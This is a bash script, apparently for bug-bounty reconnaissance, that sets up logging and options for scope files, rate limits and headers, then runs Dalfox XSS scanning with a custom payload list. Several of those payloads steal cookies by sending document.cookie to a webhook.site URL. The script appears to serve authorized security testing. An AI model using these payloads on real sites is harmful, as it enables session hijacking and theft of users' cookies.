#!/bin/bash

# CONFIG
subdomains_result_fname="subdomains.txt"
urls_result_fname="urls.txt"
fuzz_result_fname="to_fuzz.txt"

lance_log_fname="lance_log.txt"
katana_log_fname="katana_log.txt"
httpx_log_fname="httpx_log.txt"
feroxbuster_log_fname="feroxbuster_log.txt"
subfinder_log_fname="subfinder_log.txt"
dalfox_log_fname="dalfox_log.txt"
tmp_log_fname="tmp_log.txt"

logs_dname="logs"
static_files_dname="static"
results_dname="results"

wordlist_fname="wordlist.txt"
params_fname="params.txt"
xss_payload_fname="xss.txt"

# Default value for -rl parameter
rl_def=1000

# Function to display script usage
display_usage() {
    echo "Usage: $0 <scope> <out_scope> <OPTIONS>"
    echo "Example: $0 -t scope.txt -i out_scope.txt -r 10 -H 'Cookie: PHPSESSID=dGVzdAo=' -H 'User-Agent: Custom-Agent.v12.test'"
    echo ""
    echo "OPTIONS:"
    echo " -h:        <HELP>     prints this message and exit"
    echo " -t:        <TARGET>   filename with the scope of your project"
    echo " -i:        <IGNORE>   filename with out of scope domains/sub-domains"
    echo " -r:        <RATE>     rate limit for your requests"
    echo " -H:        <HEADERS>  custom headers to pass to your requests"
    echo ""
    exit 1
}

# Function to store results on files
log() {
    data=$1
    fname=$2
    save_message=$3
    tmp_path=$(get_path tmp_log_fname)

    path=$(get_path $fname)

    # If the file does not exist then create it
    if [[ ! -f "$path" ]]; then
        echo -n "" > $path
    fi

    # Always store only unique values
    echo $data | tr " " "\n" | grep -E "[A-Za-z0-9]+" >> $path
    cat $path | sort -u > $tmp_path
    cp $tmp_path $path 2>/dev/null

    # The 3rd parameter here will be save_message
    # By default we assume is True and print the message
    if [[ -z $save_message ]]; then     # True
        display_saved_message $path
    fi
}

log_clean() {
    fname=$1
    path=$(get_path $fname)

    rm -f $path 2>/dev/null
}

log_read() {
    fname=$1
    path=$(get_path $fname)

    cat $path 2>/dev/null
}

get_path() {
    fname=$1
    # Check in wich directory the file should be saved
    if [[ $(echo $fname | grep "log") ]]; then
        echo "$logs_dname/$fname"
    else
        echo "$results_dname/$fname"
    fi
}

display_saved_message() {
    echo "[!] Saved to:"
    echo "$(pwd)/$1"
}

display_empty_scope_message() {
    echo -e "${red}[-]${white} Scope is empty."
    echo -e "${red}[-]${white} Exiting..."
}

# Colors
red="\033[0;31m"
green="\033[1;32m"
white="\033[0m"
blue='\033[0;34m'

# Reset variables
headers=""
scope_fname=""
out_scope_fname=""


# Parse command line options
while getopts "H:r:t:i:h" opt; do
    case ${opt} in
        H )
            cmd="$(echo "$OPTARG" | grep :)"
            if [[ ! -z $cmd ]]; then
                headers+=" -H '$OPTARG "
            else
                headers+="$OPTARG '"
            fi
        ;;
        r )
            rl="$OPTARG"
        ;;
        t )
            scope_fname="$OPTARG"
        ;;
        i )
            out_scope_fname="$OPTARG"
        ;;
        h )
            display_usage
        ;;
        \? )
            echo ""
            display_usage
            exit 2
        ;;
    esac
done
shift $((OPTIND - 1))

# Check if the required arguments are provided
if [[ -z $scope_fname ]]; then
    display_empty_scope_message
    exit 0
fi

# Check for an empty scope
cmd=$(cat "$scope_fname" | wc -l)
if [[ $cmd -lt 1 ]]; then
    display_empty_scope_message
    exit 0
fi

# If -rl parameter not provided, assign default value
if [[ -z "$rl" || ! "$rl" =~ ^[0-9]+$ ]]; then
    rl="$rl_def"
fi

# Displays the date and time
date

###################################################################### SETUP END ###################################################
###################################################################### TEST BEGINS ###################################################


# Store XSS Payloads to use with Dalfox
echo '<img src ="x" onerror= "confirm(Dalfox)">
#"><img src ="x" onerror= "confirm(Dalfox)">
--><img src ="x" onerror= "confirm(Dalfox)"><!--
*/=confirm(Dalfox);/*
*/=document.location.href="https://webhook.site/6cd916f2-9563-42e0-9680-d1781966b257?"+document.cookie;/*
#"><img src=/ onerror=document.location.href="https://webhook.site/6cd916f2-9563-42e0-9680-d1781966b257?"+document.cookie;>
-->#"><img src=/ onerror=document.location.href="https://webhook.site/6cd916f2-9563-42e0-9680-d1781966b257?"+document.cookie;><!--' > $(get_path $xss_payload_fname)

# Dalfox
echo "[!] Scanning URLs for XSS"
cmd="dalfox pipe --timeout 2 --no-color --poc-type='curl' -o $(get_path $dalfox_log_fname) --silence --delay $(expr 1000 / $rl) --no-spinner --har-file-path $(get_path $tmp_log_fname) --ignore-return 301,302,403,404 -w 1000 --mass -p $(cat $(get_path $params_fname) | tr '\n' ',') --only-custom-payload --custom-payload $(get_path $xss_payload_fname)"
echo -e "${blue}[+]${white} $cmd"
data="$(cat $(get_path $urls_result_fname)| grep -vE '\.jpg|\.jpeg|\.gif|\.css|\.tif|\.tiff|\.png|\.ttf|\.woff|\.woff2|\.ico|\.pdf|\.svg|\.txt|\.xml|\.js' | grep -E '\?.*=' | $cmd 2>/dev/null)"